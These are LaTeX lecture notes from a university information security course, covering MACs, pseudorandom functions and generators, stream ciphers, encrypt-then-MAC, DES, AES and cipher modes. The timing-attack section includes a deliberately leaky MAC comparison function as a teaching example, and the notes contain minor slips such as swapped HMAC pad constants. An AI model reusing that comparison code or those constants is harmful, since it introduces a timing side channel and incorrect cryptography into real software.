%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  This is the main document for the COS 432 (Information Security) notes    %%
%%  from  Fall 2012. To compile these notes, you should put the following     %%
%%  files in the same directory:                                              %%
%%    InfoSec.tex (this file), InfoSecPreamble.tex, InfoSecTitle.tex,         %%
%%    Lecture01.tex, Lecture02.tex, ...                                       %%
%%  Then run 'latex InfoSec.tex' (without quotes) three times (twice might be %%
%%  enough).                                                                  %%
%%                                                                            %%
%%  If you want to get a pdf, don't use pdflatex, because I use pstricks.     %%
%%  Instead, use latex, then dvips, then ps2pdf.                              %%
%%                                                                            %%
%%  Brenda (all format copied from Anton:                                     %%
%%      http://stacky.net/wiki/index.php?title=Course_notes)                  %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%% The preamble loads packages, theorem styles, and macros %%%%%%%%%%%%%%%%%%%%%
\documentclass[12pt,twoside]{article}

 \usepackage{amsmath}   % Some symbols
 \usepackage{amsthm}    % Does theorem stuff
 \usepackage{amssymb}       % More symbols and fonts
 \usepackage{empheq}        % Some more extensible arrows, like \xmapsto
 \usepackage{enumerate}     % Formatting of enumerates
 \usepackage{fancybox}      % More outline options for boxes
 \usepackage{mathrsfs}      % Sheafy font \mathscr{}
 \usepackage{multirow}      % For tables
 
 %% (this package is not needed for the 2015-01-19 version of this manuscript
 %% and beyond)
 %%
 %% \usepackage{pstricks}      % PSTricks!
 
 \usepackage{rotating}      % Rotate text
 \usepackage{xcolor}        % For colors (links)
 \usepackage[all]{xy}       % Include XY-pic
    \SelectTips{cm}{10}     % Use the nicer arrowheads
    \everyxy={<2.5em,0em>:} % Sets the scale I like
 \usepackage[colorlinks,
             linkcolor=black,
             pagebackref,
             bookmarksnumbered=true]{hyperref}

%% Pagestyle stuff %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 % Begin paragraphs with an empty line rather than an indent                  %%
 \usepackage[parfill]{parskip}                                                %%
 \usepackage{fancyhdr}                                                        %%
   \pagestyle{fancy}                                                          %%
   \fancyhf{}   % Delete the current section for header and footer            %%
 \usepackage[paperheight=11in,                                                %%
             paperwidth=8.5in,                                                %%
             outer=1.2in,                                                     %%
             inner=1.2in,                                                     %%
             bottom=.7in,                                                     %%
             top=.7in,                                                        %%
             includeheadfoot]{geometry}                                       %%
   \addtolength{\headwidth}{.75in}                                            %%
   \fancyhead[RO,LE]{\thepage}                                                %%
   \fancyhead[RE,LO]{\sectionname}                                            %%
   \setlength{\headheight}{15.8pt}                                            %%
   \raggedbottom                                                              %%
%% End Pagestyle stuff %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%% Stuff for keeping track of sections %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \newcommand{\sektion}[2]{\stepcounter{section}                               %%
     \renewcommand{\thesection}{#1}                                           %%
     \newpage\section{#2} \gdef\sectionname{#1\quad #2}}                      %%
 \newcommand{\subsektion}[1]{\subsection*{#1}                                 %%
     \addcontentsline{toc}{subsection}{#1}}                                   %%
 % This is the empty section title, before any section title is set           %%
 \newcommand\sectionname{}                                                    %%
%% End stuff for keeping track of sections %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%% Theorem Styles and Counters %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \renewcommand{\theequation}{\thesection.\arabic{equation}}                   %%
 \makeatletter                                                                %%
    % Make the equation counter reset each section                            %%
    \@addtoreset{equation}{section}                                           %%
    % Make the footnote counter reset each section                            %%
    \@addtoreset{footnote}{section}                                           %%
                                                                              %%
 \newenvironment{warning}[1][]{                                               %%
    \begin{trivlist} \item[] \noindent                                        %%
    \begingroup\hangindent=2pc\hangafter=-2                                   %%
    \clubpenalty=10000%                                                       %%
    \hbox to0pt{\hskip-\hangindent\manfntsymbol{127}\hfill}\ignorespaces      %%
    \refstepcounter{equation}\textbf{Warning~\theequation}                    %%
    \@ifnotempty{#1}{\the\thm@notefont \ (#1)}\textbf{.}                      %%
    \let\p@@r=\par \def\p@r{\p@@r \hangindent=0pc} \let\par=\p@r}             %%
    {\hspace*{\fill}$\lrcorner$\endgraf\endgroup\end{trivlist}}               %%
                                                                              %%
 \newenvironment{exercise}[1][]{\begin{trivlist}                              %%
    \item{\bf Exercise\@ifnotempty{#1}{ #1}.}\it}{\end{trivlist}}             %%
 \newenvironment{solution}{\begin{trivlist}                                   %%
    \item{\it Solution.}}{\end{trivlist}}                                     %%
                                                                              %%
 \def\newprooflikeenvironment#1#2#3#4{                                        %%
      \newenvironment{#1}[1][]{                                               %%
%          \refstepcounter{equation}                                          %%
          \begin{proof}[{\rm\csname#4\endcsname{#2}\@ifnotempty{##1}          %%
              {\the\thm@notefont\(##1)}\csname#4\endcsname{.}}]               %%
          \def\qedsymbol{#3}}                                                 %%
         {\end{proof}}}                                                       %%
 \makeatother                                                                 %%
                                                                              %%
 \newprooflikeenvironment{definition}{Definition}{$\diamond$}{textbf}         %%
 \newprooflikeenvironment{example}{Example}{$\diamond$}{textbf}               %%
 \newprooflikeenvironment{remark}{Remark}{$\diamond$}{textbf}                 %%
                                                                              %%
 \theoremstyle{plain}                                                         %%
 \newtheorem{theorem}[equation]{Theorem}                                      %%
 \newtheorem*{claim}{Claim}                                                   %%
 \newtheorem*{lemma*}{Lemma}                                                  %%
 \newtheorem*{theorem*}{Theorem}                                              %%
 \newtheorem{lemma}[equation]{Lemma}                                          %%
 \newtheorem{corollary}[equation]{Corollary}                                  %%
 \newtheorem{proposition}[equation]{Proposition}                              %%
%% End Theorem Styles and Counters %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%% Misc %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \newenvironment{sidenote}[1]{
    \shadowbox{\parbox{\linewidth}{#1}}
 }
%% End Misc %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%% Macros %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \newcommand{\brenda}[1]{[[\ensuremath{\bigstar\bigstar\bigstar} #1]]}        %%
 \newcommand*\xor{\oplus}
%% End Macros %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\begin{document}{

% Any subset of the following lines can be commented out

 \title{\vspace*{-2cm} Notes for COS 432 - Information Security\vspace*{-12mm}\footnote{This work is licensed under
a Creative Commons Attribution-NonCommercial 4.0 International license.  
For details see \url{https://creativecommons.org/licenses/by-nc/4.0/}}}
 \author{}
 \date{}
 \maketitle
 \phantomsection    % This makes the hyperref package happier for some reason

 {\thispagestyle{empty}
  \vspace*{-2em}
%  \addcontentsline{toc}{section}{Contents}
  \tableofcontents
 }
}{  % Title page, Contents

%!TEX root = InfoSec.tex 
% Lecture 1: 10 September 2014
\sektion{0}{Course Information}
Professor: Ed Felten

Website: \url{http://bit.ly/1wcHQIT} and Piazza

Lectures: 11am Monday, Wednesday in McCosh 50

\sektion{1}{Message Integrity}
\subsektion{Sending messages}
\ovalbox{Alice} $\xrightarrow{m}$
    \ovalbox{Mallory} $\xrightarrow{?}$
    \ovalbox{Bob}

{\bf Threat Models:}, what adversary can do and accomplish vs. what we want to do and accomplish. We generally assume
         that Mallory is malicious in the most devious possible way, as opposed
         to random error. In this case of Alice sending Bob a message: 
\begin{itemize}
    \item Mallory can see and forge messages
    \item Mallory wants to get Bob to accept a message that Alice didn't send
    \item Alice and Bob want Alice to be able to send a message and have Bob receive it in an untampered form.
\end{itemize}

\sidenote{
    {\bf CIA Properties}
    \begin{itemize}
        \item Confidentiality: trying to keep information secret from someone
        \item Integrity: making sure information hasn't been tampered with
        \item Availability: making sure system is there and running when needed (hardest to achieve!)
    \end{itemize}
}

In this problem, the goal is only integrity. \\

\sidenote{
    {\bf Role of stories in security:}
    \begin{itemize}
        \item Pro: easy to follow
        \item Cons:
        \begin{itemize}
            \item In reality,``Alice/Bob'' is a computer; for example, a server with no common sense
            \item In reality, ``Alice/Bob'' is a person + computer (one may have some
                    knowledge that other doesn't, e.g. knowledge divergence in
                    phishing attack)
            \item We might be biased into rooting for one side or the other and lose impartiality
        \end{itemize}
    \end{itemize}
}

What to send:\\

\ovalbox{Alice} $\xrightarrow{(m, f(m))}$
    \ovalbox{Mallory} $\xrightarrow{(a,b)}$
    \ovalbox{Bob} : accept $a$ iff $f(a) = b$

where $f$ is a {\bf Message Authentication Code (MAC)}\\

Properties $f$ needs to be a secure MAC:
\begin{enumerate}
    \item deterministic (Bob needs to get the same answer that Alice got every time)
    \item easily computable by Alice and Bob
    \item not computable by Mallory (else Mallory can send $(x, f(x))$ for any
        $x$ s/he wants)
\end{enumerate}

Choosing $f$:
\begin{itemize}
    \item Picking a secret function is risky because it is difficult 
    	to quantify how likely Mallory will be able to guess the function.
    \item Use a random function...
        \begin{table}[!h]\centering\begin{tabular}{r|ll}
            input & output &\\
            \cline{1-2}
            $\emptyset$ & 01011... & $\leftarrow$ 256 coin flips\\
            0 & 101... &\\
            1 & ... &\\
        \end{tabular}\end{table}

\sidenote{
    {\bf ``secure MAC game'': Us vs. Mallory}

    \hspace*{0.5 cm} repeat until Mallory says ``stop'': \{\\
        \hspace*{1 cm} Mallory chooses $x_i$\\
        \hspace*{1 cm} we announce $f(x_i)$\\
    \hspace*{0.5 cm} \}\\
    \hspace*{0.5 cm} Mallory chooses $y \not\in \{x_i\}$\\
    \hspace*{0.5 cm} Mallory guesses $f(y)$: wins if right
    \\

    $f$ is a secure MAC if and only if every efficient (polytime) strategy for Mallory 
    wins with negligible (probability that goes to 0) probability. In other words, 
    $f$ is a secure MAC if Mallory can't do better than random guessing.
    
    \bigskip
    
    \begin{theorem*}{A random function is a secure MAC.}\end{theorem*}
    \emph{Intuition:} Mallory asks to reveal certain entries, but for $y$
        Mallory is trying to guess the result of the coin flips
}
    \item ...Or more practically, a pseudorandom function:

        {\bf pseudorandom function (PRF)}: ``looks random'', ``as good as
            random'', practical to implement

        typical approach:
        \begin{itemize}
            \item \underline{public} family of function $f_0, f_1, f_2, \dots$
            \item \underline{secret} key $k$ which is, for example, a 256 bit random value
            \item \underline{use} $f(k, x)$
        \end{itemize}
        
\sidenote{
    {\bf Kerckhoffs's principle:}

    Use a public function family and a randomly chosen secret key.
    \bigskip
    Advantages:
    \begin{enumerate}
        \item can quantify probability that key will be guessed
        \item different people can use the same functions with different keys
        \item can change key if needed (if it's given out or lost)
    \end{enumerate}
}
\\
\sidenote{
    {\bf ``PRF game'' against Mallory}:

    \hspace*{0.5 cm} we flip a coin secretly to get $b \in \{0,1\}$\\
    \hspace*{0.5 cm} if $b = 0$, let $g = $ random function\\
    \hspace*{0.5 cm} else, $g=f(k, x)$ for random $k$\\
    \hspace*{0.5 cm} repeat until Mallory says ``stop'': \{\\
        \hspace*{1 cm} Mallory chooses $x_i$\\
        \hspace*{1 cm} we announce $g(x_i)$\\
    \hspace*{0.5 cm} \}\\
    \hspace*{0.5 cm} Mallory guesses latest $b$: wins if right\\
    
    
    $f$ is a PRF if and only if every efficient strategy for Mallory wins with probability less than
    $0.5 + \epsilon$ where $\epsilon$ is negligible. \\

    Note: Mallory can always win by exhaustive search of the range of $k$ in $f(k, x)$, so need to
    limit Mallory to ``practical''\\

    \begin{theorem*}{If $f$ is a PRF, then $f$ is a secure MAC}\end{theorem*}
    \begin{proof} By contradiction. There's a reduction going on; we wanted
    to find a secure MAC, which led us to wanting to find a secure PRF
    \end{proof}
}
\end{itemize}

What to send (new):\\

\ovalbox{Alice} $\xrightarrow{(m, f(k, m)}$
    \ovalbox{Mallory} $\xrightarrow{(a,b)}$
    \ovalbox{Bob} : accept $a$ iff $f(k, a) = b$

Assumptions:
\begin{enumerate}
    \item $k$ is kept secret from Mallory
    \item Alice and Bob have established $k$ in advance
    \item Mallory doesn't tamper with the code that computes the function $f(k, a)$
\end{enumerate}

\subsektion{Do PRF's exist?}
Answer: maybe/ we hope so (some functions haven't lost yet)\\

Here's one: HMAC-SHA256
$$f(k, x) = S((k \xor z_1) || S((k \xor z_2) || x))$$
where $z_1 = 0x3636\dots$, $z_2 = 0x5c5c\dots$ (note that $||$ is concatenation)
and $S$ is ``SHA-256'': start with ``compression function'' $C$, taking 256 and
512 bits in, outputting 256 bits

\makebox[2cm]{}\framebox[8cm]{input}\framebox[2cm]{pad}\\
\makebox[2cm]{}\framebox[2cm]{}\framebox[2cm]{}\framebox[2cm]{}\framebox[2cm]{}
\mbox{512 bit blocks}\\
\makebox[2cm]{}\makebox[2cm]{$\Downarrow$}\makebox[2cm]{$\Downarrow$}
\makebox[2cm]{$\Downarrow$}\makebox[2cm]{$\Downarrow$}\\
\makebox[2cm]{const $\rightarrow$}\makebox[2cm]{C}\makebox[.2cm]{$\rightarrow$}
\makebox[1.4cm]{C}\makebox[4.4cm]{$\cdots$}\makebox[2cm]{output}

Note: This is subject to length extension attacks\\

\subsektion{Cryptographic Hash Functions}
They include MD5, SHA-1, SHA-?, etc: functions that take arbitrary size inputs and return
fixed size outputs that are ``hard to reverse." They are dangerous to use directly because
they don't have the properties you think/want then to have.\\

Properties of a cryptographic hash function
\begin{enumerate}
	\item Collision resistance:\\
		Can't find $x \neq y$ such that $H(x) = (y)$
	\item Second preimage resistance:\\
		Given $x$, can't find $y$ such that $H(x) = H(y)$
	\item If $x$ is chosen randomly from a distribution \textit{with high entropy},
	then given $H(x)$, you can't find $x$
\end{enumerate}

Better: use a PRF even if $k$ is non-secret

\subsektion{Timing Attacks}
Suppose Alice and Bob implement MAC-based integrity with the following code

\begin{verbatim}
def macCheck(a, b, key) {
    correctMac = Mac(key, a);
    for (i = 0; i < length; ++i) {
        if (correctMac[i] != b[i]) return false
        }
    return true
}
\end{verbatim}

The problem? The execution time depends on the first $n$ correct characters. Mallory may observe the runtime to
gain insight on cracking the code.

\subsektion{Multiple Alice - Bob messages}
How to deal with Mallory sending messages out of order or resending old messages
\begin{enumerate}
\item append sequence number to each message:\\
        Alice sends $m_0' = (0, m_0)$, $m_1' = (1, m_1)$
\item switch keys per message
\end{enumerate}
}{
%!TEX root = InfoSec.tex
% Lecture 2: 19 September 2012
\sektion{2}{Randomness}
Best way to get a value that is unknown to an adversary is to choose a random
value, but it's hard to get this in practice. Randomness (or a lack thereof) is often a weakness in a security system.\\

Recall from last lecture that a PRF works as a MAC.

\sidenote{
    {\bf What is a PRF?}\\

    Two views:
    \begin{enumerate}
        \item family of functions $f_k(x)$
        \item function $f(k,x)$. This is the view we'll be using for this class.
    \end{enumerate}
}

{\bf True randomness}:
\begin{itemize}
    \item outcome of some inherently random process
    \item assume it ``exists'' but it's scarce and hard to get
\end{itemize}

{\bf In security, "random" means unpredictable}:
\begin{itemize}
    \item to whom? E.x., in a PRF, the result can be considered random with respect to someone who does not know the secret key.
    \item when?
\end{itemize}

{\bf Pseudorandom generator (PRG)}:
\begin{itemize}
    \item takes a small ``seed'' that's truly random as input E.x. a few coin flips, instead of flipping a coin each time
    \item generates a long sequence of ``good enough'' values, i.e. unlimited pseudorandomness.
    \item maintains ``hidden state'' that changes as generator operates
    \item output is indistinguishable from truly random output in the practical sense, i.e. an efficient party can not distinguishs
    \item the generator needs to be deterministic, because if it is not it must be driven by some kind of randomness, and the reason we are doing this is because randomness is scarce
\end{itemize}

{\bf Randomness service}:
\begin{itemize}
    \item OS service, callable by application
    
\end{itemize}

\begin{definition}
PRG is {\bf secure} if its output is indistinguishable from a truly random
value/string.\\ This is based on the game versus Mallory (can Mallory
tell real randomness from prg? similar to prf game from lecture 1),
where secure means that Mallory wins 50\% ($+\epsilon$) assuming
Mallory has limited resources, where $\epsilon$ is negligible.
\end{definition}

\begin{tabular}{cccccccc}
&&&&&&& \\
Seed & $\xrightarrow{init}$ & $ S_0 $ & $\xrightarrow{advance}$ & $ S_1$ & $\xrightarrow{advance}$ & $S_2$ & etc.\\
& & $\downarrow$ & & $\downarrow$ & &  $\downarrow$ &\\
& & $output_0$ & & $output_1$ & &  $output_2$ &\\
&&&&&&&
\end{tabular}

Another desirable property is {\bf Forward Secrecy} (backtracking resistance):\\
If Mallory compromises the hidden state of the generator at time $t$, Mallory
can't backtrack to reconstruct past outputs of the generator.\\

Note that if an adversary breaks in at time $t$, they \textit{can} play it forward and see the outputs at time $t + x$

Most PRGs are made up of an \textbf{init} function to initialize state
$S$ and an \textbf{advance} function to step to a new state.

\begin{example}{A PRG that is \underline{not} FS but is secure:}
    \begin{itemize}
    \item Let $f$ be a PRF
    \item init: $(seed, 0)$
    \item advance: $(seed, k) \rightarrow (seed, k + 1)$
    \item output: $f(seed, k)$
    \end{itemize}
    If Mallory knows the counter $k$ at any point, she can decrement it and run the function forwards again. 
\end{example}

\begin{example}{A PRG that is FS and secure:}
    \begin{itemize}
    \item Let $f$ be a PRF
    \item init: $seed$
    \item advance: $S \rightarrow f(S, 0)$
    \item output: $f(S, 1)$
    \end{itemize}
    This resists backtracking because the advance function relies on the PRF, and the seed is overwritten
\end{example}

\subsektion{Randomness as a system service}
Hard parts: getting seed, recovering from compromise, even if we don't know whether the state has been compromised. We want to be continuously recovering because we might not notice a compromise.\\
Create a new function, $recover(S, random data) \rightarrow state$\\

Getting a good seed: want true randomness
\begin{itemize}
    \item special circuit
    \item ambient audio/video: lava lamps! (lavarand)
\end{itemize}
problems: physical random processes are difficult in practice, not \emph{truly} random (correlations)\\

Alternate view: \textbf{collect} data unpredictable to adversary
\begin{itemize}
    \item exact history of key presses
    \item exact path of mouse
    \item exact history of packet traffic
    \item periodic screenshot
    \item internal temperature
    \item ambient audio
\end{itemize}


Then: process to \textbf{extract}, or distill down to ``pure''
randomness - feed it all into a PRF. If there's enough randomness in
input, output will be ``pure random''.  Can, for example, use
SHA256(all the data). SHA256 consumes data one block at a time, so we don't 
need to collect and store all the data; we can get/use the data iteratively.\\

 Use this to:
\begin{itemize}
    \item seed the system PRG
    \item recover/renew the state (mix fresh randomness in with hidden state) using PRF,
        to re-establish secrecy of hidden state\\

        NOTE: Mistake to add a single bit at a time since Mallory can keep
        up with 2 possibilities at a time, but if we wait until have a
        lot, say 256 bits of randomness, then Mallory can't keep up ($2^{256}$
        possibilities), even if she knows the algorithm used.
\end{itemize}

Hard to estimate actual amount of entropy in pool, so wait for too
much randomness before mixing to remain conservative.\\
There's also a problem with ``headless'' machines, like servers, that don't have
enough areas of randomness to draw from.

{\bf Linux}:
\begin{itemize}
    \item {\tt /dev/random} gives pure random bits, but have to wait
    \item {\tt /dev/urandom} is output of PRG, renewed via ``pure'' randomness
\end{itemize}

The boot problem: At startup,
\begin{itemize}
    \item least access to randomness (system is clean)
    \item highest demand for randomness (programs want keys)
\end{itemize}

Solutions (with their problems):
\begin{itemize}
    \item save some randomness only accessible at boot:\\
        hard to tell that this hasn't been observed, or used on last boot
    \item connect to someone across network to give pseudorandomness:\\
        want secure connection but don't yet have key (okay if have just enough
        for that key, or semi-predictable and hope Mallory doesn't guess)
\end{itemize}

\subsektion{Message Confidentiality}
Now may have a (passive) adversary/eavesdropper Eve who can only listen:\\
\makebox[5cm]{\ovalbox{Alice} $\rightarrow$ \ovalbox{Bob}}\\
\makebox[5cm]{$\downarrow$}\\
\makebox[5cm]{\ovalbox{Eve}}\\

Message processing:\\
\makebox[1.5cm]{$\xrightarrow{\text{plaintext}}$}
    \framebox[2.5cm]{$E$ (encrypts)}
    \makebox[1.5cm]{$\xrightarrow{\text{ciphertext}}$}
    \framebox[2.5cm]{$D$ (decrypts)}
    \makebox[1.5cm]{$\xrightarrow{\text{plaintext}}$}\\
\makebox[1.5cm]{}\makebox[2.5cm]{$\uparrow$}
    \makebox[1.5cm]{}\makebox[2.5cm]{$\uparrow$}\\
\makebox[1.5cm]{}\makebox[2.5cm]{key $k$}
    \makebox[1.5cm]{}\makebox[2.5cm]{key $k$}\\

Goal: ciphertext does not convey anything about plaintext. Bob can recover text, Eve cannot.

\textbf{Semantic Security}

\sidenote{
    {\bf ``Encryption game'' against Eve:}\\\\
    \hspace*{0.5cm} Allow Eve to pick piece of plaintext, we provide encryption $E_k(x_i)$ until she is satisified
    \hspace*{0.5 cm} Eve chooses two pieces of plaintext\\
    \hspace*{0.5cm} We flip a coin and encrypt one of them\\
    \hspace*{0.5cm} Eve guesses which was encrypted: wins if right

    We say that the encrpytion method is  secure if Eve can't do
    better than random guessing (50/50) + negligible $\epsilon$.  This is known as
    \textbf{semantic security}.\\

    Note: if we were being more rigorous in our definitions, we would use a
    stronger definition of security for encryption here so that it's easier to
    combine later with integrity. However, the methods we are learning are
    secure by any of the definitions.
}

{\bf First approach: one-time pad (known to be semantically secure)}
\begin{enumerate}
    \item Alice and Bob jointly generate a long random string $k$ (``the pad'')
    \item $E(k, x) = k \xor x$
    \item $D(k, y) = k \xor y = k \xor (k \xor x) = (k \xor k) \xor x = x$
\end{enumerate}
Problems:
\begin{enumerate}
    \item can't reuse key:\\
        $(k \xor a) \xor (k \xor b) = a \xor b$\\
        worst case, Eve knows one message, but even knowing that the messages
        are say English text can give Eve information from character
        distributions
    \item need really long key -- needs to be as long as sum of message lengths
\end{enumerate}
Idea: use a PRG to ``stretch'' a small key (called a ``stream cipher'')
\begin{itemize}
    \item Start with fixed-size random $k$, add a ``nonce'': unique, i.e. don't resue nonce value,
      but not secret.  Use PRF(k, nonce) to seed a PRG.
    \item Alice and Bob run identical PRGs in parallel with same key
    \item xor messages with PRG's output
    \item Do not re-use (key, nonce) pair
\end{itemize}
  This approach still does not provide integrity.

\subsektion{Confidentiality and integrity}
Few approaches.
\begin{enumerate}
  \item Use E(x $||$ M(x)) \hspace{1cm}SSL/TLS
  \item Use E(x) $||$ M(E(x)) \hspace{1cm}IPSec  **This is the winner (because math).
  \item Use E(x) $||$ M(x) \hspace{1cm}SSH\\
\end{enumerate}

\begin{theorem}
If E is a semantically secure cipher, and M is a secure MAC, then \#2 is secure.
\end{theorem}

Encrypt plaintext, then append MAC: Bob first integrity checks, then decrypts.
Note that we need to use separate keys for confidentiality and integrity, and a
separate set of two keys for reverse channel (Bob to Alice).\\

If we have only one shared key, we seed the PRG with the shared key and then use
four  values it produces for the message sending.
}{
% Lecture 3: 24 September 2012
\sektion{3}{Block ciphers}

\sidenote{
    {\bf Story from WWII:}

    Pacific war: lots of radio communications; crypto and US decryptions paid a
        huge role

    Admiral Nimitz had advantage of code break giving Japanese battle plan
        (Battle of Midway)

    Most successful code was used by the US Marines: the Navajo language served
        as a code by translating the first letter of an English word into a
        Navajo word and sending that by radio (allowed speech communication).

    Even when they got a Navajo speaker, the Japanese were unable to usefully
        decrypt these messages.
}

Last time: Stream ciphers
    $$E(k,m) = D(k, m) = \text(PRG)(k) \xor m$$

Alternative approach: Block ciphers

Start with function that encrypts a fixed-size block of data (and fixed-size
        key) and build up from there
\begin{itemize}
    \item may run faster
    \item many PRGs work this way anyway
\end{itemize}

Note that block cipher is not the same thing as a PRF, since a PRF may have no
    inverse ($\exists x_1, x_2 \text{ s.t. } f(k,x_1) = f(k,x_2)$

Want: psuedorandom permutation (PRP)
\begin{itemize}
    \item function from $n$-bit input (plus key) to $n$-bit output
    \item if $x_1 \neq x_2$, then $f(k, x_1) \neq f(k, x_2)$
    \item psuedorandom as expected from previous definitions -- should be
        indistinguishable from truly random to an adversary
\end{itemize}

It is useful to compare the different types of security functions we have
seen. Note: Can use any of PR function/permutation/generator to build
the other two.

\begin{center}
\begin{tabular}{l|llll}
 Property    &  PR Functions         &  PR Permutations  &  PR Generators  &  Hash Functions       \\
\hline
 Input       &  Any                  &  Fixed-size       &  Fixed-size     &  Any                  \\
 Output      &  Fixed-size           &  Fixed-size       &  Any            &  Fixed-size           \\
 Has Key     &  Yes                  &  Yes              &  Yes            &  No                   \\
 Invertible  &  No                   &  With key         &  No             &  Depends              \\
 Collisions  &  Yes, but can't find  &  No               &  No             &  Yes, but can't find  \\
\end{tabular}
\end{center}

Challenge: design a very hairy function that's invertible, but only by someone
who knows the key. A PRP will have this property.\\

Minimal properties of a good block cipher:
\begin{itemize}
    \item efficient
    \item highly nonlinear (``confusion property'') - hard for adversary to
        invert
    \item mix input bits together (``diffusion'') - this is important so that
        small changes to the input will create complicated changes in the output
    \item depend on the key
\end{itemize}

How to get these properties: Feistel network

\makebox[6cm]{plaintext}\\
\framebox[6cm]{\makebox[3cm]{left half}\textbar\makebox[3cm]{right half}}\\
\makebox[6cm]{\makebox[1cm]{$\downarrow$}\makebox[4cm]{}\makebox[1cm]{$\downarrow$}}\\
\makebox[6cm]{\makebox[1cm]{$\xor$}\makebox[1cm]{$\longleftarrow$}\framebox[2cm]{$f(k_0)$}\makebox[1cm]{$\longleftarrow$}\makebox[1cm]{$\downarrow$}}   ``feistal round''\\
\makebox[6cm]{\makebox[1cm]{$\downarrow$}\makebox[4cm]{}\makebox[1cm]{$\downarrow$}}\\
\makebox[6cm]{------------------------------------------------}\\
\makebox[6cm]{\makebox[1cm]{$\downarrow$}\makebox[1cm]{$\longrightarrow$}\framebox[2cm]{$f(k_1)$}\makebox[1cm]{$\longrightarrow$}\makebox[1cm]{$\xor$}}   another round\\
\makebox[6cm]{\makebox[1cm]{$\downarrow$}\makebox[4cm]{}\makebox[1cm]{$\downarrow$}}\\

Add as many rounds as you want, alternating left and right rounds.\\

Why? Easy to invert since each round is its own inverse, so inverse of series
of rounds is the same series in reverse order. This makes it so that $f$ can be
as difficult as we want and the process is still invertible, so why not make $f$
a PRF?\\

\begin{theorem*}
If $f$ is a PRF, then 4-round feistel network is a PRP.
\end{theorem*}
Often use weaker rounds (which may be faster to compute), but more of them.

\begin{example}{DES (Data Encryption Standard)}
    \begin{itemize}
        \item block size 64 bits
        \item 56-bit key
        \item Feistel network - 16 (weak) rounds
    \end{itemize}

    History:
    \begin{itemize}
        \item designed in secrey by IBM and NSA
        \item 1978
        \item US government standard
        \item private sector followed
    \end{itemize}

    Backdoor known to designers but not public? Concerns by public over the
    source - history of US offering other governments intentionally weak ciphers

    Reason for secrecy around design was that some of the classification: wanted
    to make secure against differential cryptanalysis, but that wasn't publicly
    known yet and NSA wanted to keep using it against others.

    Designed to be slow in software to discourage it from being implemented in
    software

    Key size problem:\\
    $2^{56}$ steps for a brute-force search to recover an unknown key, which is
    currently feasable, though not in 1978 (except maybe by NSA?)

    This can be addressed by iterating DES with multiple keys. Note that you
    need to do this three times to get $2^{112}$ for brute force search.
\end{example}

\begin{example}{AES (Advanced Encryption Standard)}
    Probably the best available today, coming from overcoming drawbacks of DES
    \begin{itemize}
        \item softward efficiency a goal
        \item large, variable key size (128-, 192-, 256-bit variants)
        \item open, public process for choosing and generating the cipher\\
            run by NIST and a design contest judged on pre-determined criteria
    \end{itemize}

    2002 - NIST chose Rijndael (Belgian designers)
\end{example}

\subsektion{128-bit AES}
\begin{itemize}
    \item 128-bit input, output, and key
    \item not feistel design
    \item lookup table public

    \item ten rounds (generally cryptanalysis is a small-round break and then
            extending the tactic to a full number of rounds, so use a safe
            number then add extra rounds for safety buffer), each with four steps
        \begin{enumerate}
            \item non-linear step (``confusion''):

                run each byte through a certain non-linear function (lookup
                table of a permutation)
            \item shift step (``diffusion''):

                take 2nd row and shift right ($>>>$) by one slot, putting
                overflow in next row, 3rd row by 2 slots, 4th row by 3 slots
                (circular shift)

                spreads out columns
            \item linear mix (``diffusion''):

                take each column, treat as 4-vector and multiply by a certain
                matrix (specified in standard)

                mixes within column
            \item key-addition step (key-dependent):

                xor each byte with corresponding byte of the key

                Note: the key expansion could be a source of weakness (to get
                the ten keys needed from one)
        \end{enumerate}
    \item (think of 128-bits as 4x4 array of bytes)
    \item to decrypt, do inverses in reverse order
\end{itemize}

\subsektion{How to handle variable-size messages}
Problems:
\begin{itemize}
    \item padding - plaintext not a multiple of blocksize
    \item ``cipher modes'' - dealing with multi-block messages
\end{itemize}

Padding: most important property needs to be that recipient can unambiguously
    tell what is padding and what is not\\

    Good method: add bits 10* until reach end of block (pull off all 0's at end
    then the 1). Remember that you must add {\emph some} padding (at least one
    bit) to every message. This works similarly with bytes.\\

\bigskip
Cipher modes: encrypt multi-block messages
\begin{itemize}
    \item ECB (Electronic Code Book) !! BAD - not semantically secure - do not use !!
        $$C_i = E(k, P_i)$$
        Same plaintext results in same ciphertext -- leaks information to
        adversary
    \item CBC (Cipher Block Chaining): Common, pretty good\\
        ``strawman CBC'', $R_i$ random
        $$C_i = (R_i, E(k, R_i \xor P_i)$$
        Good, but doubles message size\\
        Idea: use $C_{i-1}$ instead of $R_i$\\
        $$C_i = E(k, C_{i-1} \xor P_i)$$
        What about the first block? Generate a random value, the
        ``initialization vector (IV)'', to prepend to message to serve as
        $C_{-1}$. Don't want to reuse with same key, or adversary could compare
        the first block of the ciphertext to see if same plaintext, but
        random-ish generation good enough, and can use same key over and over.
    \item CTR (Counter mode): Generally agreed on as best to use.
        Similar to a stream cipher.
        $$C_i = E(k, \text{messageid} || \text{counter}) \xor P_i$$
        messageid must be unique, then it's okay to reuse key.\\
        Note: this would not be forward secret as a PRG.\\
        Reasons to use CTR over PRG: more efficient on commodity hardware and
        perhaps you trust AES more than your PRF (even though you can't prove it
        either way).
\end{itemize}
}{
%!TEX root = InfoSec.tex
